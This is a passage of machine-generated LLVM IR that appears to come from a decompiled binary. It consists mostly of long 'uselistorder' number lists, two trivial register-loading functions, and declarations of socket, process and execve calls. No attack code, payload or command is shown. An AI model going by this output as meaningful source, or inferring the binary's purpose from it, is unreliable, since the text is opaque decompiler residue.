  uselistorder i32 -1, { 170, 0, 1, 36, 271, 171, 39, 40, 37, 38, 172, 41, 42, 43, 44, 45, 169, 173, 174, 175, 2, 176, 177, 3, 4, 178, 179, 5, 57, 58, 6, 258, 180, 46, 47, 82, 312, 272, 83, 259, 149, 7, 260, 84, 8, 9, 85, 240, 10, 11, 12, 91, 89, 86, 241, 136, 137, 90, 88, 87, 150, 242, 261, 181, 182, 79, 48, 13, 92, 273, 183, 184, 274, 275, 93, 262, 14, 94, 49, 50, 185, 186, 187, 95, 263, 188, 64, 96, 16, 17, 152, 59, 60, 151, 264, 66, 65, 61, 62, 189, 138, 139, 190, 191, 15, 265, 276, 192, 80, 51, 193, 277, 18, 52, 194, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 195, 313, 314, 196, 168, 53, 73, 278, 197, 198, 279, 280, 81, 74, 75, 281, 282, 283, 284, 285, 145, 97, 286, 167, 153, 71, 70, 199, 287, 288, 289, 290, 200, 154, 291, 19, 292, 201, 20, 202, 293, 294, 155, 98, 246, 99, 337, 338, 100, 316, 101, 247, 102, 339, 103, 251, 104, 340, 105, 341, 106, 342, 107, 343, 108, 248, 109, 249, 110, 344, 111, 345, 76, 346, 21, 203, 22, 112, 252, 253, 204, 205, 206, 254, 255, 156, 23, 243, 72, 207, 208, 157, 209, 24, 25, 68, 113, 295, 114, 245, 115, 256, 116, 296, 117, 297, 118, 266, 119, 298, 120, 299, 158, 267, 121, 268, 210, 122, 123, 300, 166, 124, 211, 212, 213, 214, 215, 216, 217, 218, 165, 301, 125, 269, 219, 270, 220, 26, 67, 77, 78, 317, 221, 302, 222, 159, 303, 54, 304, 305, 160, 27, 223, 224, 140, 146, 144, 306, 28, 147, 31, 29, 30, 148, 161, 307, 308, 225, 32, 55, 63, 141, 56, 250, 309, 162, 126, 318, 127, 315, 128, 257, 129, 310, 130, 320, 131, 347, 132, 244, 133, 321, 134, 311, 135, 319, 226, 227, 228, 229, 230, 231, 163, 232, 233, 234, 235, 236, 237, 238, 33, 34, 35, 142, 143, 69, 239, 164 }
  uselistorder i32* @global_var_18000.485, { 1, 0 }
  uselistorder i32 1, { 542, 234, 447, 463, 464, 448, 543, 544, 1027, 1028, 1029, 545, 304, 308, 307, 309, 305, 303, 306, 1030, 227, 1031, 547, 546, 289, 290, 293, 291, 288, 292, 287, 331, 330, 332, 410, 1032, 1033, 35, 1034, 362, 361, 363, 548, 320, 321, 319, 1035, 373, 1036, 374, 1037, 890, 891, 892, 893, 894, 895, 896, 549, 354, 355, 353, 350, 349, 351, 352, 897, 470, 898, 899, 550, 262, 261, 263, 258, 264, 260, 259, 396, 900, 901, 551, 286, 278, 902, 411, 903, 908, 909, 452, 910, 911, 912, 471, 472, 913, 914, 552, 311, 316, 314, 315, 313, 312, 553, 915, 554, 108, 107, 106, 109, 916, 555, 42, 43, 917, 918, 919, 920, 556, 127, 128, 803, 804, 805, 806, 807, 808, 809, 810, 811, 559, 558, 557, 201, 202, 203, 812, 813, 814, 815, 816, 563, 562, 561, 560, 208, 207, 213, 209, 212, 211, 210, 214, 215, 206, 216, 412, 921, 922, 413, 923, 924, 925, 926, 927, 473, 928, 929, 930, 931, 932, 565, 564, 84, 82, 86, 83, 87, 88, 89, 81, 85, 389, 937, 933, 934, 935, 936, 437, 566, 103, 104, 102, 827, 828, 829, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 567, 65, 66, 59, 60, 61, 62, 64, 63, 397, 954, 953, 192, 1105, 1106, 1107, 1108, 1109, 1110, 568, 366, 367, 368, 365, 569, 236, 398, 474, 1038, 570, 13, 11, 10, 14, 12, 1111, 1112, 475, 571, 143, 144, 140, 141, 139, 142, 1039, 1040, 573, 572, 344, 345, 347, 346, 348, 574, 32, 575, 476, 477, 576, 246, 956, 414, 955, 399, 379, 959, 415, 957, 0, 960, 961, 962, 963, 579, 578, 577, 197, 198, 964, 965, 966, 967, 968, 453, 969, 970, 454, 972, 478, 973, 449, 450, 457, 1, 455, 456, 974, 971, 479, 975, 443, 586, 585, 529, 584, 583, 530, 582, 581, 580, 390, 440, 976, 977, 978, 979, 980, 416, 587, 138, 830, 831, 832, 588, 359, 360, 358, 357, 1041, 400, 1042, 1168, 401, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 531, 590, 589, 79, 80, 72, 77, 73, 78, 71, 74, 76, 75, 480, 1113, 1114, 1115, 1116, 1117, 1118, 591, 532, 91, 90, 92, 33, 34, 404, 417, 1043, 481, 1044, 1045, 482, 387, 418, 384, 402, 403, 1046, 483, 1047, 1048, 1049, 1050, 419, 1051, 375, 1052, 1053, 484, 1054, 1055, 1056, 605, 604, 603, 602, 601, 600, 599, 598, 597, 596, 595, 594, 593, 533, 592, 45, 44, 54, 49, 47, 46, 53, 50, 52, 55, 51, 48, 57, 58, 56, 1057, 1058, 534, 606, 220, 218, 223, 225, 221, 222, 217, 219, 224, 1059, 1060, 1061, 1062, 385, 1063, 1064, 1065, 607, 273, 274, 271, 275, 272, 1066, 1067, 608, 243, 1119, 1120, 1121, 1122, 1123, 175, 174, 171, 173, 170, 169, 176, 172, 609, 276, 1068, 611, 610, 161, 162, 163, 420, 458, 614, 613, 612, 615, 317, 616, 135, 136, 617, 228, 229, 618, 269, 105, 619, 110, 620, 322, 621, 277, 622, 323, 623, 324, 624, 356, 625, 248, 626, 281, 364, 200, 2, 630, 629, 628, 627, 41, 40, 485, 631, 421, 486, 632, 247, 633, 868, 638, 637, 636, 635, 634, 298, 299, 301, 302, 300, 857, 858, 641, 640, 639, 250, 251, 642, 391, 875, 386, 876, 422, 643, 184, 190, 183, 187, 186, 189, 191, 185, 188, 392, 817, 644, 164, 167, 168, 165, 166, 869, 423, 870, 424, 871, 646, 645, 16, 17, 15, 18, 19, 647, 154, 150, 156, 152, 151, 153, 155, 648, 650, 649, 1181, 425, 653, 652, 651, 342, 341, 654, 158, 159, 157, 160, 655, 231, 233, 230, 232, 656, 245, 244, 426, 1124, 657, 279, 280, 658, 257, 659, 199, 660, 137, 661, 129, 662, 235, 663, 118, 664, 117, 665, 93, 487, 981, 388, 982, 983, 488, 1002, 669, 668, 667, 666, 94, 96, 97, 95, 670, 671, 878, 879, 3, 880, 427, 881, 673, 672, 326, 327, 325, 1182, 674, 958, 675, 904, 905, 906, 907, 1069, 1070, 676, 343, 405, 1071, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 239, 237, 238, 240, 241, 1003, 1004, 4, 1005, 5, 6, 7, 428, 1006, 1007, 8, 204, 205, 1008, 380, 99, 98, 1163, 1164, 818, 819, 820, 821, 822, 823, 824, 1186, 195, 196, 193, 194, 1072, 182, 181, 489, 677, 490, 1009, 1010, 1011, 1012, 678, 535, 147, 148, 145, 149, 146, 1128, 1125, 1126, 1127, 381, 406, 131, 134, 130, 132, 133, 1129, 1130, 1131, 1132, 1133, 1134, 679, 113, 111, 115, 112, 116, 114, 429, 1135, 1136, 491, 1137, 681, 680, 252, 253, 254, 1013, 1014, 683, 682, 119, 120, 121, 685, 684, 256, 255, 859, 687, 686, 101, 100, 444, 1073, 493, 1074, 1075, 430, 431, 1076, 1077, 494, 1078, 1080, 1081, 1082, 495, 1084, 432, 1085, 1083, 492, 1086, 496, 1087, 445, 1088, 1089, 1079, 691, 690, 689, 688, 20, 26, 23, 27, 22, 21, 28, 29, 24, 25, 1090, 692, 333, 337, 334, 336, 335, 693, 295, 294, 1091, 1092, 1093, 694, 30, 31, 446, 393, 1095, 394, 1096, 433, 1097, 1098, 1100, 382, 1101, 497, 1102, 395, 1099, 436, 702, 701, 700, 699, 698, 697, 696, 695, 36, 38, 37, 39, 498, 407, 703, 283, 284, 285, 1094, 459, 536, 704, 310, 499, 825, 826, 705, 339, 338, 340, 1183, 460, 1184, 1185, 706, 329, 328, 270, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 408, 1152, 709, 708, 707, 124, 123, 122, 126, 125, 500, 441, 442, 860, 712, 711, 710, 67, 69, 68, 70, 714, 713, 297, 716, 715, 717, 1153, 1154, 1155, 1156, 1157, 720, 719, 718, 179, 180, 861, 721, 178, 722, 177, 723, 296, 724, 226, 242, 725, 318, 726, 369, 727, 282, 728, 249, 461, 1158, 1159, 462, 1165, 1166, 833, 834, 835, 836, 837, 838, 504, 839, 840, 378, 502, 503, 841, 505, 842, 506, 843, 501, 844, 735, 734, 733, 732, 731, 730, 729, 510, 507, 508, 509, 511, 512, 739, 738, 737, 736, 845, 846, 537, 740, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 741, 539, 538, 742, 743, 872, 513, 514, 515, 750, 540, 749, 748, 747, 746, 745, 744, 873, 874, 516, 517, 759, 758, 757, 541, 756, 755, 754, 753, 752, 751, 877, 409, 451, 518, 519, 764, 763, 762, 761, 760, 267, 265, 266, 766, 765, 465, 882, 376, 377, 883, 884, 885, 770, 769, 768, 767, 886, 771, 887, 772, 888, 774, 773, 775, 889, 776, 1015, 1016, 520, 1017, 1018, 1019, 521, 383, 1020, 522, 1021, 523, 783, 782, 781, 780, 779, 778, 777, 268, 1022, 524, 1023, 438, 434, 1024, 784, 525, 1103, 526, 1104, 527, 528, 792, 791, 790, 789, 788, 787, 786, 785, 1160, 1161, 1162, 793, 795, 794, 439, 1167, 435, 1025, 9, 1026, 796, 799, 798, 797, 467, 862, 863, 466, 864, 865, 468, 469, 866, 867, 800, 801, 802, 372, 371, 370 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_15760() local_unnamed_addr {
dec_label_pc_15760:
  %v5_15764 = load i32, i32* @r0, align 4
  ret i32 %v5_15764

; uselistorder directives
  uselistorder i32* @r0, { 9, 45, 46, 65, 66, 67, 68, 69, 70, 71, 181, 42, 182, 183, 12, 184, 185, 186, 187, 21, 72, 188, 189, 190, 191, 27, 138, 139, 140, 141, 142, 145, 143, 144, 40, 73, 74, 75, 76, 77, 78, 79, 146, 147, 8, 237, 238, 192, 193, 194, 110, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 87, 88, 89, 90, 35, 37, 239, 18, 195, 196, 197, 54, 55, 198, 56, 57, 199, 200, 201, 58, 202, 203, 204, 205, 206, 207, 208, 209, 41, 210, 211, 212, 29, 49, 31, 276, 277, 278, 50, 279, 25, 51, 52, 280, 281, 61, 62, 63, 64, 20, 10, 22, 23, 53, 282, 283, 128, 24, 80, 81, 82, 14, 120, 121, 122, 123, 124, 125, 126, 273, 274, 32, 15, 241, 19, 240, 170, 171, 172, 43, 3, 34, 36, 213, 214, 215, 216, 269, 38, 59, 217, 17, 173, 174, 243, 244, 245, 246, 247, 248, 39, 249, 250, 251, 252, 175, 176, 253, 111, 218, 219, 220, 4, 33, 221, 222, 5, 7, 0, 1, 223, 224, 6, 225, 226, 227, 16, 228, 229, 230, 2, 231, 232, 83, 242, 84, 85, 86, 284, 285, 254, 255, 256, 257, 258, 259, 112, 113, 114, 115, 116, 117, 118, 119, 233, 234, 44, 260, 261, 262, 263, 264, 265, 28, 266, 30, 275, 26, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 127, 129, 130, 131, 132, 133, 134, 135, 136, 137, 177, 178, 179, 180, 267, 268, 270, 272, 271, 235, 236, 13, 11, 47, 48, 60 }
}

define i32 @function_15768() local_unnamed_addr {
entry:
  %v3_1576c = load i32, i32* @r4, align 4
  %v0_15774 = call i32 @function_80b0()
  call void @__pseudo_branch(i32 %v3_1576c)
  ret i32 %v0_15774

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 18, 2, 3, 4, 5, 6, 10, 11, 12, 13, 23, 24, 20, 21, 22, 7, 25, 14, 15, 9, 16, 17, 8, 1, 19 }
  uselistorder i32 0, {}
  uselistorder i32* @r4, { 47, 589, 297, 10, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 48, 49, 314, 50, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 181, 5, 182, 183, 4, 184, 185, 186, 12, 187, 11, 188, 189, 190, 473, 474, 191, 194, 197, 198, 199, 200, 201, 192, 193, 195, 196, 13, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 217, 216, 218, 219, 220, 221, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 14, 16, 64, 15, 65, 66, 67, 68, 222, 223, 224, 225, 2, 226, 227, 228, 229, 230, 231, 232, 235, 233, 234, 39, 236, 237, 335, 336, 337, 475, 476, 17, 477, 478, 479, 480, 481, 482, 18, 483, 484, 485, 486, 487, 488, 489, 338, 339, 490, 491, 492, 493, 494, 495, 496, 497, 498, 340, 341, 342, 343, 238, 239, 122, 123, 593, 594, 597, 598, 240, 242, 241, 244, 243, 7, 249, 245, 250, 6, 251, 252, 253, 254, 255, 256, 19, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 95, 96, 97, 98, 99, 100, 344, 345, 346, 347, 348, 349, 350, 599, 600, 351, 352, 353, 354, 355, 356, 357, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 499, 500, 501, 502, 503, 504, 505, 20, 506, 507, 69, 358, 359, 21, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 22, 372, 373, 374, 375, 23, 376, 377, 378, 24, 379, 380, 381, 382, 383, 384, 8, 385, 0, 386, 387, 25, 508, 509, 510, 513, 514, 124, 125, 126, 127, 128, 388, 1, 129, 130, 617, 618, 9, 515, 516, 131, 132, 150, 619, 620, 621, 622, 623, 624, 133, 134, 135, 625, 626, 26, 627, 628, 629, 630, 642, 643, 644, 645, 43, 653, 40, 637, 638, 639, 640, 641, 631, 632, 633, 151, 152, 153, 154, 155, 156, 157, 158, 634, 635, 169, 170, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 159, 160, 161, 162, 163, 584, 585, 164, 165, 166, 586, 587, 588, 636, 517, 518, 519, 520, 27, 28, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 389, 390, 114, 115, 171, 172, 391, 392, 393, 394, 269, 270, 395, 396, 397, 398, 271, 272, 273, 274, 275, 29, 276, 277, 278, 279, 280, 281, 646, 647, 648, 246, 247, 248, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 282, 283, 284, 285, 30, 286, 287, 288, 534, 535, 536, 537, 538, 539, 540, 541, 542, 545, 546, 547, 548, 289, 290, 291, 292, 293, 549, 31, 550, 551, 136, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 433, 432, 434, 435, 436, 437, 438, 439, 440, 32, 441, 442, 443, 449, 450, 451, 452, 3, 453, 454, 455, 456, 457, 458, 459, 33, 460, 34, 461, 462, 463, 464, 81, 82, 83, 444, 446, 445, 447, 448, 543, 544, 84, 44, 85, 86, 87, 88, 89, 90, 91, 92, 41, 93, 94, 649, 650, 651, 652, 552, 553, 554, 555, 556, 557, 558, 35, 559, 36, 560, 561, 562, 563, 564, 565, 566, 45, 137, 42, 138, 139, 140, 141, 142, 143, 144, 145, 465, 466, 467, 468, 567, 568, 569, 570, 571, 572, 573, 37, 38, 576, 577, 511, 512, 173, 174, 469, 470, 591, 592, 101, 102, 595, 596, 471, 472, 574, 575, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 116, 117, 118, 119, 120, 121, 167, 168, 175, 176, 177, 178, 179, 180, 294, 295, 296, 578, 579, 580, 581, 582, 583, 146, 147, 148, 149, 46, 590 }
}

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
